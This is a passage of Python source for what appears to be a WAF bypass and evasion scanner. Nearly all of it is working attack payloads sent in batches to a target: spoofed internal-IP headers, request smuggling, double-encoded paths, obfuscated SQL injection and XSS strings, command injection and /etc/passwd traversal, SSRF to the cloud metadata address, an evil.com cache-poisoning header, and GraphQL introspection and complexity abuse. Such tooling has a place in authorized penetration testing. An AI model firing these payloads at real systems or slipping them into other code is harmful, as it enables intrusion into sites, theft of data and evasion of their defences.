        return self._batch_test(test_cases)
    
    def _test_x_forwarded_for(self) -> List[Dict[str, Any]]:
        """Test X-Forwarded-For bypass - optimized batch"""
        ips = ['127.0.0.1', '10.0.0.1', '192.168.1.1', '169.254.169.254']
        test_cases = [
            {'headers': {'X-Forwarded-For': ip}, 'technique': f'X-Forwarded-For: {ip}'}
            for ip in ips
        ]
        return self._batch_test(test_cases)
    
    def _test_x_forwarded_host(self) -> List[Dict[str, Any]]:
        """Test X-Forwarded-Host bypass - optimized batch"""
        hosts = ['localhost', '127.0.0.1', self.domain]
        test_cases = [
            {'headers': {'X-Forwarded-Host': host}, 'technique': f'X-Forwarded-Host: {host}'}
            for host in hosts
        ]
        return self._batch_test(test_cases)
    
    def _test_x_original_url(self) -> List[Dict[str, Any]]:
        """Test X-Original-URL bypass - optimized batch"""
        paths = ['/', '/admin', '/%2e%2e/', '/..;/']
        test_cases = [
            {'headers': {'X-Original-URL': path}, 'technique': f'X-Original-URL: {path}'}
            for path in paths
        ]
        return self._batch_test(test_cases)
    
    def _test_cache_control(self) -> List[Dict[str, Any]]:
        """Test Cache-Control bypass - optimized batch"""
        test_cases = [
            {'headers': {'Cache-Control': 'no-cache'}, 'technique': 'Cache-Control: no-cache'},
            {'headers': {'Cache-Control': 'no-store'}, 'technique': 'Cache-Control: no-store'},
            {'headers': {'Pragma': 'no-cache'}, 'technique': 'Pragma: no-cache'},
        ]
        return self._batch_test(test_cases)
    
    def _test_encoding_bypass(self) -> List[Dict[str, Any]]:
        """Test encoding bypass - optimized batch"""
        paths = ['/%2e/', '/..%2f', '/%252e%252e/']
        test_cases = [
            {'headers': {}, 'path': path, 'technique': f'Path Encoding: {path}'}
            for path in paths
        ]
        return self._batch_test(test_cases)
    
    def _test_method_bypass(self) -> List[Dict[str, Any]]:
        """Test HTTP method bypass"""
        results = []
        methods = ['POST', 'OPTIONS', 'PUT', 'DELETE']
        
        for method in methods:
            result = self._test_request({'X-Technique': f'Method: {method}'}, method=method)
            if result:
                results.append(result)
                if result.get('bypass'):
                    print(f"  [✓] BYPASS: {result['technique']} | {result['reason']} | {result['severity']}")
        
        return results
    
    def _test_content_type_bypass(self) -> List[Dict[str, Any]]:
        """Test Content-Type bypass - optimized batch"""
        content_types = ['application/json', 'application/xml', 'text/plain', 'multipart/form-data']
        test_cases = [
            {'headers': {'Content-Type': ct}, 'method': 'POST', 'technique': f'Content-Type: {ct}'}
            for ct in content_types
        ]
        return self._batch_test(test_cases)
    
    def _test_transfer_encoding_smuggling(self) -> List[Dict[str, Any]]:
        """Test Transfer-Encoding smuggling bypass - optimized batch"""
        test_cases = [
            {'headers': {'Transfer-Encoding': 'chunked'}, 'method': 'POST', 'technique': 'Transfer-Encoding: chunked'},
            {'headers': {'Transfer-Encoding': ' chunked'}, 'method': 'POST', 'technique': 'Transfer-Encoding: [space]chunked'},
            {'headers': {'Transfer-Encoding': 'ChUnKeD'}, 'method': 'POST', 'technique': 'Transfer-Encoding: ChUnKeD'},
            {'headers': {'Transfer-Encoding': 'chunked', 'Content-Length': '0'}, 'method': 'POST', 'technique': 'CL.TE Smuggling'},
        ]
        return self._batch_test(test_cases)
    
    def _test_http2_downgrade(self) -> List[Dict[str, Any]]:
        """Test HTTP/2 to HTTP/1.1 downgrade bypass - optimized batch"""
        test_cases = [
            {'headers': {'Connection': 'HTTP2-Settings', 'Upgrade': 'h2c'}, 'technique': 'HTTP/2 Downgrade: h2c'},
            {'headers': {'Connection': 'Upgrade', 'Upgrade': 'HTTP/2.0'}, 'technique': 'HTTP/2 Downgrade: HTTP/2.0'},
            {'headers': {'Connection': 'close'}, 'technique': 'HTTP/1.0 Fallback'},
        ]
        return self._batch_test(test_cases)
    
    def _test_websocket_upgrade(self) -> List[Dict[str, Any]]:
        """Test WebSocket upgrade bypass - optimized batch"""
        test_cases = [
            {'headers': {'Upgrade': 'websocket', 'Connection': 'Upgrade', 'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==', 'Sec-WebSocket-Version': '13'}, 'technique': 'WebSocket Upgrade (Standard)'},
            {'headers': {'upgrade': 'WebSocket', 'connection': 'upgrade'}, 'technique': 'WebSocket Upgrade (Case Variation)'},
        ]
        return self._batch_test(test_cases)
    
    def _test_range_header(self) -> List[Dict[str, Any]]:
        """Test Range header bypass - optimized batch"""
        test_cases = [
            {'headers': {'Range': 'bytes=0-1024'}, 'technique': 'Range: bytes=0-1024'},
            {'headers': {'Range': 'bytes=0-0'}, 'technique': 'Range: Single Byte'},
            {'headers': {'Range': 'bytes=-500'}, 'technique': 'Range: Last 500 Bytes'},
        ]
        return self._batch_test(test_cases)
    
    def _test_double_encoding(self) -> List[Dict[str, Any]]:
        """Test double/triple encoding bypass - optimized batch"""
        test_cases = [
            {'headers': {}, 'path': '/%252e%252e/', 'technique': 'Double Encoded: ../'},
            {'headers': {}, 'path': '/%25252e%25252e%25252f', 'technique': 'Triple Encoded: ../'},
            {'headers': {}, 'path': '/%u002e%u002e%u002f', 'technique': 'Unicode Encoded: ../'},
        ]
        return self._batch_test(test_cases)

    # ============================================================================
    # WAF DETECTION & FINGERPRINTING
    # ============================================================================
    
    def _detect_waf(self) -> List[Dict[str, Any]]:
        """Detect WAF vendor and version"""
        results = []
        print("  [*] Detecting WAF vendor...")
        
        try:
            # Make baseline request for WAF detection
            resp = safe_request(self.target, timeout=self.timeout, allow_redirects=True)
            if not resp:
                return results
            
            headers_lower = {k.lower(): v.lower() for k, v in resp.headers.items()}
            cookies_str = str(resp.cookies.get_dict()).lower()
            server_header = headers_lower.get('server', '').lower()
            body_lower = resp.text.lower()[:5000]  # Check first 5KB
            
            detected_wafs = []
            
            for waf_name, signatures in WAF_SIGNATURES.items():
                confidence = 0
                matched_indicators = []
                
                # Check headers
                for sig_header in signatures.get('headers', []):
                    if sig_header.lower() in headers_lower:
                        confidence += 30
                        matched_indicators.append(f"Header: {sig_header}")
                
                # Check cookies
                for sig_cookie in signatures.get('cookies', []):
                    if sig_cookie.lower() in cookies_str:
                        confidence += 25
                        matched_indicators.append(f"Cookie: {sig_cookie}")
                
                # Check server header
                for sig_server in signatures.get('server', []):
                    if sig_server.lower() in server_header:
                        confidence += 35
                        matched_indicators.append(f"Server: {sig_server}")
                
                # Check body patterns
                for pattern in signatures.get('body_patterns', []):
                    if pattern.lower() in body_lower:
                        confidence += 20
                        matched_indicators.append(f"Body: {pattern}")
                
                if confidence > 0:
                    detected_wafs.append({
                        'waf': waf_name,
                        'confidence': min(confidence, 100),
                        'indicators': matched_indicators
                    })
            
            # Sort by confidence
            detected_wafs.sort(key=lambda x: x['confidence'], reverse=True)
            
            for waf in detected_wafs:
                severity = 'HIGH' if waf['confidence'] >= 70 else 'MEDIUM' if waf['confidence'] >= 40 else 'LOW'
                result = {
                    'technique': f"WAF Detection: {waf['waf'].upper()}",
                    'bypass': False,
                    'status': resp.status_code,
                    'reason': f"Confidence: {waf['confidence']}% - {', '.join(waf['indicators'][:3])}",
                    'severity': severity,
                    'category': 'WAF_DETECTION',
                    'details': waf
                }
                results.append(result)
                print(f"  [+] Detected WAF: {waf['waf'].upper()} (Confidence: {waf['confidence']}%)")
            
            if not detected_wafs:
                print("  [*] No known WAF signatures detected")
                
        except requests.exceptions.ConnectionError:
            print("  [!] WAF detection skipped: Target unreachable")
        except Exception as e:
            logger.debug(f"WAF detection error: {e}")
        
        return results
    
    def _detect_cdn(self) -> List[Dict[str, Any]]:
        """Detect CDN provider"""
        results = []
        print("  [*] Detecting CDN...")
        
        try:
            resp = safe_request(self.target, timeout=self.timeout, allow_redirects=True)
            if not resp:
                return results
            
            headers_lower = {k.lower(): v.lower() for k, v in resp.headers.items()}
            server_header = headers_lower.get('server', '').lower()
            
            detected_cdns = []
            
            for cdn_name, signatures in CDN_SIGNATURES.items():
                confidence = 0
                matched = []
                
                for sig_header in signatures.get('headers', []):
                    if sig_header.lower() in headers_lower:
                        confidence += 40
                        matched.append(f"Header: {sig_header}")
                
                for sig_server in signatures.get('server', []):
                    if sig_server.lower() in server_header:
                        confidence += 40
                        matched.append(f"Server: {sig_server}")
                
                # Check DNS CNAME records
                try:
                    import socket
                    cname = socket.gethostbyname_ex(self.domain)[0]
                    for cdn_cname in signatures.get('cnames', []):
                        if cdn_cname in cname:
                            confidence += 30
                            matched.append(f"CNAME: {cdn_cname}")
                except:
                    pass
                
                if confidence > 0:
                    detected_cdns.append({
                        'cdn': cdn_name,
                        'confidence': min(confidence, 100),
                        'indicators': matched
                    })
            
            detected_cdns.sort(key=lambda x: x['confidence'], reverse=True)
            
            for cdn in detected_cdns:
                result = {
                    'technique': f"CDN Detection: {cdn['cdn'].upper()}",
                    'bypass': False,
                    'status': resp.status_code,
                    'reason': f"Confidence: {cdn['confidence']}%",
                    'severity': 'INFO',
                    'category': 'CDN_DETECTION',
                    'details': cdn
                }
                results.append(result)
                print(f"  [+] Detected CDN: {cdn['cdn'].upper()} (Confidence: {cdn['confidence']}%)")
            
            if not detected_cdns:
                print("  [*] No known CDN detected")
                
        except Exception as e:
            logger.error(f"CDN detection error: {e}")
        
        return results

    # ============================================================================
    # HEADER-BASED SCANS
    # ============================================================================
    
    def _test_header_injection(self) -> List[Dict[str, Any]]:
        """Test X-Forwarded-For, X-Real-IP spoofing"""
        results = []
        
        # Internal/trusted IP addresses
        trusted_ips = [
            '127.0.0.1',
            '10.0.0.1',
            '172.16.0.1', 
            '192.168.1.1',
            '169.254.169.254',  # AWS metadata
            '::1',  # IPv6 localhost
            'localhost',
        ]
        
        header_types = [
            'X-Forwarded-For',
            'X-Real-IP',
            'X-Client-IP',
            'X-Remote-IP',
            'X-Remote-Addr',
            'X-Originating-IP',
            'True-Client-IP',
            'CF-Connecting-IP',
            'Fastly-Client-IP',
        ]
        test_cases = []
        for header in header_types:
            for ip in ['127.0.0.1', '10.0.0.1', '169.254.169.254']:
                test_cases.append({'headers': {header: ip}, 'technique': f'{header}: {ip}'})
        return self._batch_test(test_cases)
    
    def _test_origin_header_bypass(self) -> List[Dict[str, Any]]:
        """Manipulate Origin/Referer headers - optimized batch"""
        test_cases = [
            {'headers': {'Origin': 'null'}, 'technique': 'Origin: null'},
            {'headers': {'Origin': f'https://{self.domain}'}, 'technique': 'Origin: Same domain'},
            {'headers': {'Origin': 'https://localhost'}, 'technique': 'Origin: localhost'},
            {'headers': {'Referer': f'https://{self.domain}/'}, 'technique': 'Referer: Same origin'},
            {'headers': {'Referer': 'https://www.google.com/'}, 'technique': 'Referer: Google'},
            {'headers': {'Origin': 'null', 'Referer': 'null'}, 'technique': 'Origin+Referer: null'},
        ]
        return self._batch_test(test_cases)
    
    def _test_custom_header_fuzzing(self) -> List[Dict[str, Any]]:
        """Test for headers that bypass WAF rules - optimized batch"""
        test_cases = [
            {'headers': {'X-Custom-IP-Authorization': '127.0.0.1'}, 'technique': 'X-Custom-IP-Authorization'},
            {'headers': {'X-Requested-With': 'XMLHttpRequest'}, 'technique': 'X-Requested-With: XMLHttpRequest'},
            {'headers': {'X-Debug': 'true'}, 'technique': 'X-Debug: true'},
            {'headers': {'X-Skip-WAF': 'true'}, 'technique': 'X-Skip-WAF: true'},
            {'headers': {'X-Internal': 'true'}, 'technique': 'X-Internal: true'},
            {'headers': {'X-Rewrite-URL': '/'}, 'technique': 'X-Rewrite-URL'},
        ]
        return self._batch_test(test_cases)

    # ============================================================================
    # ENCODING BYPASS SCANS
    # ============================================================================
    
    def _test_case_manipulation(self) -> List[Dict[str, Any]]:
        """Test mixed case payloads - optimized batch"""
        case_paths = ['/Admin', '/ADMIN', '/AdMiN', '/admin/', '/.htaccess', '/.HTACCESS']
        test_cases = [
            {'headers': {}, 'path': path, 'technique': f'Case Manipulation: {path}'}
            for path in case_paths
        ]
        return self._batch_test(test_cases)
    
    def _test_comment_injection(self) -> List[Dict[str, Any]]:
        """Insert comments in payloads - optimized batch"""
        comment_paths = [
            "/?id=1'/**/OR/**/1=1",
            "/?id=1'/*!OR*/1=1",
            "/?id=1'--+-",
            "/?q=<scr<!---->ipt>",
        ]
        test_cases = [
            {'headers': {}, 'path': path, 'technique': f'Comment Injection: {path[:30]}'}
            for path in comment_paths
        ]
        return self._batch_test(test_cases)
    
    def _test_whitespace_manipulation(self) -> List[Dict[str, Any]]:
        """Use tabs, newlines, null bytes - optimized batch"""
        whitespace_paths = [
            "/?id=1%09OR%091=1",
            "/?id=1%0aOR%0a1=1",
            "/?id=1%00OR%001=1",
            "/admin%00.html",
        ]
        test_cases = [
            {'headers': {}, 'path': path, 'technique': f'Whitespace: {path[:30]}'}
            for path in whitespace_paths
        ]
        return self._batch_test(test_cases)

    # ============================================================================
    # HTTP METHOD & PROTOCOL SCANS
    # ============================================================================
    
    def _test_http_method_override(self) -> List[Dict[str, Any]]:
        """Test X-HTTP-Method-Override headers"""
        results = []
        
        override_headers = [
            {'X-HTTP-Method-Override': 'PUT', 'X-Technique': 'X-HTTP-Method-Override: PUT'},
            {'X-HTTP-Method-Override': 'DELETE', 'X-Technique': 'X-HTTP-Method-Override: DELETE'},
            {'X-HTTP-Method-Override': 'PATCH', 'X-Technique': 'X-HTTP-Method-Override: PATCH'},
            {'X-HTTP-Method': 'PUT', 'X-Technique': 'X-HTTP-Method: PUT'},
            {'X-Method-Override': 'DELETE', 'X-Technique': 'X-Method-Override: DELETE'},
            {'_method': 'PUT', 'X-Technique': '_method: PUT (Rails)'},
            {'X-HTTP-Method-Override': 'CONNECT', 'X-Technique': 'X-HTTP-Method-Override: CONNECT'},
            {'X-HTTP-Method-Override': 'TRACE', 'X-Technique': 'X-HTTP-Method-Override: TRACE'},
        ]
        
        for headers in override_headers:
            # Try as both GET and POST
            for method in ['GET', 'POST']:
                result = self._test_request(headers, method=method)
                if result:
                    results.append(result)
                    if result.get('bypass'):
                        print(f"  [✓] BYPASS: {result['technique']} | {result['reason']} | {result['severity']}")
        
        return results
    
    def _test_http_parameter_pollution(self) -> List[Dict[str, Any]]:
        """Duplicate parameters to confuse WAF parsing - optimized batch"""
        hpp_paths = [
            "/?id=1&id=2",
            "/?id=safe&id=1'OR'1'='1",
            "/?cmd=ls&cmd=;cat /etc/passwd",
            "/?file=valid.txt&file=../../../etc/passwd",
        ]
        test_cases = [
            {'headers': {}, 'path': path, 'technique': f'HTTP Parameter Pollution: {path[:30]}'}
            for path in hpp_paths
        ]
        return self._batch_test(test_cases)

    # ============================================================================
    # PROTOCOL-LEVEL SCANS
    # ============================================================================
    
    def _test_chunked_transfer(self) -> List[Dict[str, Any]]:
        """Split payloads across chunks - optimized batch"""
        test_cases = [
            {'headers': {'Transfer-Encoding': 'chunked'}, 'method': 'POST', 'technique': 'Chunked: Standard'},
            {'headers': {'Transfer-Encoding': 'chunked', 'Content-Length': '0'}, 'method': 'POST', 'technique': 'Chunked + CL: 0'},
            {'headers': {'Transfer-Encoding': ' chunked'}, 'method': 'POST', 'technique': 'Chunked: Leading space'},
        ]
        return self._batch_test(test_cases)
    
    def _test_http_pipelining(self) -> List[Dict[str, Any]]:
        """Test WAF handling of pipelined requests - optimized batch"""
        test_cases = [
            {'headers': {'Connection': 'keep-alive'}, 'technique': 'Connection: keep-alive'},
            {'headers': {'Connection': 'Keep-Alive', 'Keep-Alive': 'timeout=5, max=100'}, 'technique': 'Keep-Alive header'},
        ]
        return self._batch_test(test_cases)

    # ============================================================================
    # CACHE & CONTROL SCANS
    # ============================================================================
    
    def _test_cache_poisoning(self) -> List[Dict[str, Any]]:
        """Test WAF/cache interaction vulnerabilities - optimized batch"""
        cache_buster = f"?cb={int(time.time())}"
        test_cases = [
            {'headers': {'X-Original-URL': '/admin'}, 'path': cache_buster, 'technique': 'X-Original-URL cache poison'},
            {'headers': {'X-Rewrite-URL': '/admin'}, 'path': cache_buster, 'technique': 'X-Rewrite-URL cache poison'},
            {'headers': {'X-Forwarded-Host': 'evil.com'}, 'path': cache_buster, 'technique': 'X-Forwarded-Host cache poison'},
        ]
        return self._batch_test(test_cases)

    # ============================================================================
    # PAYLOAD-BASED BYPASS SCANS
    # ============================================================================
    
    def _test_sqli_bypass(self) -> List[Dict[str, Any]]:
        """WAF-evading SQL injection payloads - optimized batch"""
        sqli_payloads = [
            "/?id=1'/**/OR/**/1=1--",
            "/?id=1'/*!50000OR*/1=1--",
            "/?id=1'%0aOR%0a1=1--",
            "/?id=1'oR'1'='1",
            "/?id=/*!12345UNION*//*!12345SELECT*/1",
            "/?id=-1'+UnIoN+SeLeCt+1,2,3--",
        ]
        test_cases = [
            {'headers': {}, 'path': path, 'technique': f'SQLi Bypass: {path[:30]}'}
            for path in sqli_payloads
        ]
        return self._batch_test(test_cases)
    
    def _test_xss_bypass(self) -> List[Dict[str, Any]]:
        """WAF-evading cross-site scripting payloads - optimized batch"""
        xss_payloads = [
            "/?q=<svg/onload=alert(1)>",
            "/?q=<ScRiPt>alert(1)</ScRiPt>",
            "/?q=<svg/onload=&#97;&#108;&#101;&#114;&#116;(1)>",
            "/?q=<scr<script>ipt>alert(1)</script>",
            "/?q=\"><script>alert(1)</script>",
        ]
        test_cases = [
            {'headers': {}, 'path': path, 'technique': f'XSS Bypass: {path[:30]}'}
            for path in xss_payloads
        ]
        return self._batch_test(test_cases)
    
    def _test_command_injection_bypass(self) -> List[Dict[str, Any]]:
        """OS command injection evasion - optimized batch"""
        cmd_payloads = [
            "/?cmd=;ls",
            "/?cmd=|ls",
            "/?cmd=`ls`",
            "/?cmd=$(ls)",
            "/?cmd=;ls${IFS}-la",
        ]
        test_cases = [
            {'headers': {}, 'path': path, 'technique': f'Command Injection: {path[:30]}'}
            for path in cmd_payloads
        ]
        return self._batch_test(test_cases)
    
    def _test_path_traversal_bypass(self) -> List[Dict[str, Any]]:
        """Directory traversal evasion - optimized batch"""
        traversal_paths = [
            "/../../../etc/passwd",
            "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "/%252e%252e/%252e%252e/etc/passwd",
            "/..%c0%af..%c0%af/etc/passwd",
            "/../../../etc/passwd%00",
        ]
        test_cases = [
            {'headers': {}, 'path': path, 'technique': f'Path Traversal: {path[:30]}'}
            for path in traversal_paths
        ]
        return self._batch_test(test_cases)
    
    def _test_ssrf_bypass(self) -> List[Dict[str, Any]]:
        """Server-side request forgery evasion - optimized batch"""
        ssrf_payloads = [
            "/?url=http://127.0.0.1",
            "/?url=http://localhost",
            "/?url=http://[::1]",
            "/?url=http://2130706433",
            "/?url=http://169.254.169.254/latest/meta-data/",
        ]
        test_cases = [
            {'headers': {}, 'path': path, 'technique': f'SSRF Bypass: {path[:30]}'}
            for path in ssrf_payloads
        ]
        return self._batch_test(test_cases)

    # ============================================================================
    # RATE LIMIT & THRESHOLD TESTING
    # ============================================================================
    
    def _test_rate_limit_detection(self) -> List[Dict[str, Any]]:
        """Identify request thresholds"""
        results = []
        print("  [*] Testing rate limit detection...")
        
        try:
            # Quick burst test
            responses = []
            for i in range(10):
                resp = safe_request(
                    self.target,
                    timeout=self.timeout,
                    allow_redirects=False
                )
                if resp:
                    responses.append({
                        'status': resp.status_code,
                        'size': len(resp.content),
                        'headers': dict(resp.headers)
                    })
                # No delay - burst mode
            
            # Analyze responses for rate limiting indicators
            rate_limit_detected = False
            for i, r in enumerate(responses):
                # Check for rate limit status codes
                if r['status'] in [429, 503]:
                    rate_limit_detected = True
                    result = {
                        'technique': f'Rate Limit Detection: Request {i+1}',
                        'bypass': False,
                        'status': r['status'],
                        'reason': f'Rate limited after {i+1} requests',
                        'severity': 'INFO',
                        'category': 'RATE_LIMIT'
                    }
                    results.append(result)
                    print(f"  [+] Rate limit detected at request {i+1} (Status: {r['status']})")
                    break
                
                # Check for rate limit headers
                rate_headers = ['x-ratelimit-limit', 'x-ratelimit-remaining', 'retry-after', 'x-rate-limit']
                for hdr in rate_headers:
                    if hdr in [h.lower() for h in r['headers'].keys()]:
                        result = {
                            'technique': f'Rate Limit Header: {hdr}',
                            'bypass': False,
                            'status': r['status'],
                            'reason': f'Rate limit header present: {hdr}',
                            'severity': 'INFO',
                            'category': 'RATE_LIMIT'
                        }
                        results.append(result)
            
            if not rate_limit_detected:
                print("  [*] No rate limiting detected in burst of 10 requests")
                
        except requests.exceptions.ConnectionError:
            print("  [!] Rate limit test skipped: Target unreachable")
        except Exception as e:
            logger.debug(f"Rate limit test error: {e}")
        
        return results

    # ============================================================================
    # MISCELLANEOUS SCANS
    # ============================================================================
    
    def _test_ipv6_bypass(self) -> List[Dict[str, Any]]:
        """Check if IPv6 bypasses WAF rules"""
        results = []
        
        try:
            # Try to resolve IPv6 address
            ipv6_addrs = socket.getaddrinfo(self.domain, 443, socket.AF_INET6)
            if ipv6_addrs:
                ipv6_addr = ipv6_addrs[0][4][0]
                print(f"  [+] IPv6 address found: {ipv6_addr}")
                
                # Test direct IPv6 connection
                ipv6_url = f"{self.scheme}://[{ipv6_addr}]/"
                headers = {
                    'Host': self.domain,
                    'X-Technique': f'IPv6 Direct: [{ipv6_addr}]'
                }
                
                try:
                    resp = safe_request(ipv6_url, headers=headers, timeout=self.timeout)
                    if resp:
                        bypass_result = self._is_bypass(resp)
                        result = {
                            'technique': f'IPv6 Bypass: {ipv6_addr}',
                            'bypass': bypass_result['bypass'],
                            'status': resp.status_code,
                            'reason': bypass_result['reason'],
                            'severity': bypass_result['severity']
                        }
                        results.append(result)
                        if bypass_result['bypass']:
                            print(f"  [✓] BYPASS: IPv6 | {bypass_result['reason']} | {bypass_result['severity']}")
                except Exception:
                    pass
            else:
                print("  [*] No IPv6 address found for target")
        except Exception as e:
            logger.debug(f"IPv6 bypass test error: {e}")
        
        return results
    
    def _test_bot_detection_evasion(self) -> List[Dict[str, Any]]:
        """Test fingerprinting countermeasures - optimized batch"""
        test_cases = [
            {'headers': {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0'}, 'technique': 'UA: Chrome Windows'},
            {'headers': {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) Safari/604.1'}, 'technique': 'UA: Safari iPhone'},
            {'headers': {'User-Agent': 'Googlebot/2.1 (+http://www.google.com/bot.html)'}, 'technique': 'UA: Googlebot'},
            {'headers': {'User-Agent': ''}, 'technique': 'UA: Empty'},
            {'headers': {'User-Agent': 'curl/7.68.0'}, 'technique': 'UA: Curl'},
            {'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
                'Accept': 'text/html,application/xhtml+xml',
                'Accept-Language': 'en-US,en;q=0.9',
                'Sec-Fetch-Dest': 'document',
            }, 'technique': 'Full browser headers'},
        ]
        return self._batch_test(test_cases)
    
    def _test_api_endpoint_discovery(self) -> List[Dict[str, Any]]:
        """Find unprotected API routes - optimized batch"""
        api_paths = [
            '/api/', '/api/v1/', '/api/v2/', '/graphql', '/swagger/', 
            '/swagger.json', '/api/health', '/health', '/metrics', 
            '/actuator/', '/actuator/health', '/debug/',
        ]
        test_cases = [
            {'headers': {}, 'path': path, 'technique': f'API Discovery: {path}'}
            for path in api_paths
        ]
        results = []
        batch_results = self._batch_test(test_cases)
        
        for r in batch_results:
            r['category'] = 'API_DISCOVERY'
            results.append(r)
            
        return results

    # ============================================================================
    # EXTENDED DETECTION & SCANNING
    # ============================================================================
    
    def _detect_waf_rule_version(self) -> List[Dict[str, Any]]:
        """Detect WAF rule set versions (OWASP CRS, etc.)"""
        results = []
        print("  [*] Detecting WAF rule versions...")
        
        # Test payloads that trigger specific CRS rule IDs
        version_test_payloads = [
            # CRS 3.x specific patterns
            ("/?test=<script>alert(1)</script>", "941", "XSS Detection"),
            ("/?id=1' OR 1=1--", "942", "SQLi Detection"),
            ("/?cmd=;cat /etc/passwd", "932", "RCE Detection"),
            ("/?file=../../../etc/passwd", "930", "LFI Detection"),
            ("/?url=http://169.254.169.254", "934", "SSRF Detection"),
        ]
        
        detected_rules = []
        
        for payload_path, rule_prefix, rule_type in version_test_payloads:
            try:
                resp = safe_request(
                    f"{self.target}{payload_path}",
                    timeout=self.timeout,
                    allow_redirects=False
                )
                if resp and resp.status_code in [403, 406, 501]:
                    body_lower = resp.text.lower()
                    
                    # Look for rule IDs in response
                    rule_id_match = re.search(r'rule[- _]?id[:\s]*(\d+)', body_lower)
                    if rule_id_match:
                        rule_id = rule_id_match.group(1)
                        detected_rules.append({
                            'rule_id': rule_id,
                            'type': rule_type,
                            'payload': payload_path[:30]
                        })
                    
                    # Check for CRS version indicators
                    for crs_version, crs_info in OWASP_CRS_SIGNATURES.items():
                        for pattern in crs_info['patterns']:
                            if pattern.lower() in body_lower:
                                result = {
                                    'technique': f'WAF Rule Version: {crs_version.upper()}',
                                    'bypass': False,
                                    'status': resp.status_code,
                                    'reason': f'Detected pattern: {pattern}',
                                    'severity': 'INFO',
                                    'category': 'WAF_DETECTION'
                                }
                                results.append(result)
                                print(f"  [+] Detected OWASP CRS Version: {crs_version}")
                                
            except Exception as e:
                logger.debug(f"Rule version detection error: {e}")
        
        if detected_rules:
            # Analyze rule IDs to determine CRS version
            rule_ids = [int(r['rule_id'][:3]) for r in detected_rules if len(r['rule_id']) >= 3]
            
            # CRS 3.x uses 9xx rule IDs, CRS 2.x uses 95x, 96x, etc.
            if any(r >= 920 and r <= 950 for r in rule_ids):
                version_guess = "CRS 3.x (Modern)"
            elif any(r >= 950 and r <= 990 for r in rule_ids):
                version_guess = "CRS 2.x (Legacy)"
            else:
                version_guess = "Unknown CRS Version"
            
            result = {
                'technique': f'WAF Rule Analysis: {version_guess}',
                'bypass': False,
                'status': 200,
                'reason': f'Detected {len(detected_rules)} rule triggers',
                'severity': 'INFO',
                'category': 'WAF_DETECTION',
                'details': {'detected_rules': detected_rules}
            }
            results.append(result)
            print(f"  [+] WAF Rule Analysis: {version_guess}")
        
        return results
    
    def _detect_javascript_waf(self) -> List[Dict[str, Any]]:
        """Detect client-side WAFs (PerimeterX, DataDome, HUMAN, etc.)"""
        results = []
        print("  [*] Detecting JavaScript-based WAF/Bot Protection...")
        
        try:
            resp = safe_request(self.target, timeout=self.timeout, allow_redirects=True)
            if not resp:
                return results
            
            body_lower = resp.text.lower()
            headers_lower = {k.lower(): v.lower() for k, v in resp.headers.items()}
            cookies_str = str(resp.cookies.get_dict()).lower()
            
            for js_waf_name, signatures in JAVASCRIPT_WAF_SIGNATURES.items():
                confidence = 0
                matched = []
                
                # Check script patterns in body
                for pattern in signatures.get('script_patterns', []):
                    if pattern.lower() in body_lower:
                        confidence += 30
                        matched.append(f"Script: {pattern}")
                
                # Check cookies
                for cookie in signatures.get('cookies', []):
                    if cookie.lower() in cookies_str:
                        confidence += 25
                        matched.append(f"Cookie: {cookie}")
                
                # Check body patterns
                for pattern in signatures.get('body_patterns', []):
                    if pattern.lower() in body_lower:
                        confidence += 20
                        matched.append(f"Body: {pattern}")
                
                # Check headers
                for header in signatures.get('headers', []):
                    if any(header.lower() in h for h in headers_lower):
                        confidence += 25
                        matched.append(f"Header: {header}")
                
                if confidence > 0:
                    severity = 'HIGH' if confidence >= 60 else 'MEDIUM' if confidence >= 30 else 'LOW'
                    result = {
                        'technique': f'JS WAF Detection: {js_waf_name.upper()}',
                        'bypass': False,
                        'status': resp.status_code,
                        'reason': f"Confidence: {min(confidence, 100)}% - {', '.join(matched[:3])}",
                        'severity': severity,
                        'category': 'JS_WAF_DETECTION',
                        'details': {'waf': js_waf_name, 'indicators': matched}
                    }
                    results.append(result)
                    print(f"  [+] Detected JS WAF: {js_waf_name.upper()} (Confidence: {min(confidence, 100)}%)")
            
            if not results:
                print("  [*] No JavaScript-based WAF detected")
                
        except Exception as e:
            logger.debug(f"JS WAF detection error: {e}")
        
        return results
    
    def _test_graphql_bypass(self) -> List[Dict[str, Any]]:
        """GraphQL-specific bypass testing - introspection, batching, complexity abuse"""
        results = []
        print("  [*] Testing GraphQL bypass techniques...")
        
        graphql_endpoints = ['/graphql', '/api/graphql', '/v1/graphql', '/gql', '/query']
        
        # GraphQL introspection query
        introspection_query = '{"query": "{ __schema { types { name } } }"}'
        
        # Batching attack - multiple queries in one request
        batch_query = '[{"query": "{ __typename }"}, {"query": "{ __schema { types { name } } }"}]'
        
        # Complexity/DoS attack - deeply nested query
        complexity_query = '{"query": "{ users { friends { friends { friends { name } } } } }"}'
        
        # Field suggestion abuse
        field_probe = '{"query": "{ user { __tyepname } }"}'  # Intentional typo for suggestions
        
        # Alias abuse for rate limit bypass
        alias_query = '{"query": "{ a1:user(id:1){id} a2:user(id:2){id} a3:user(id:3){id} }"}'
        
        graphql_tests = [
            (introspection_query, 'GraphQL Introspection'),
            (batch_query, 'GraphQL Batching'),
            (complexity_query, 'GraphQL Complexity Abuse'),
            (field_probe, 'GraphQL Field Suggestion'),
            (alias_query, 'GraphQL Alias Abuse'),
        ]
        
        for endpoint in graphql_endpoints:
            for query, technique in graphql_tests:
                try:
                    resp = self._session.post(
                        f"{self.target}{endpoint}",
                        data=query,
                        headers={
                            'Content-Type': 'application/json',
                            'Accept': 'application/json',
                        },
                        timeout=self.timeout,
                        verify=False
                    )
                    
                    if resp and resp.status_code == 200:
                        try:
                            json_resp = resp.json()
                            # Check if we got actual data (not just errors)
                            if 'data' in json_resp and json_resp['data'] is not None:
                                result = {
                                    'technique': f'{technique}: {endpoint}',
                                    'bypass': True,
                                    'status': resp.status_code,
                                    'reason': 'GraphQL endpoint accessible',
                                    'severity': 'HIGH' if 'introspection' in technique.lower() else 'MEDIUM',
                                    'category': 'GRAPHQL_BYPASS'
                                }
                                results.append(result)
                                print(f"  [✓] BYPASS: {technique} | Endpoint: {endpoint}")
                        except:
                            pass
                            
                except Exception as e:
                    logger.debug(f"GraphQL test error for {endpoint}: {e}")
        
        return results
    
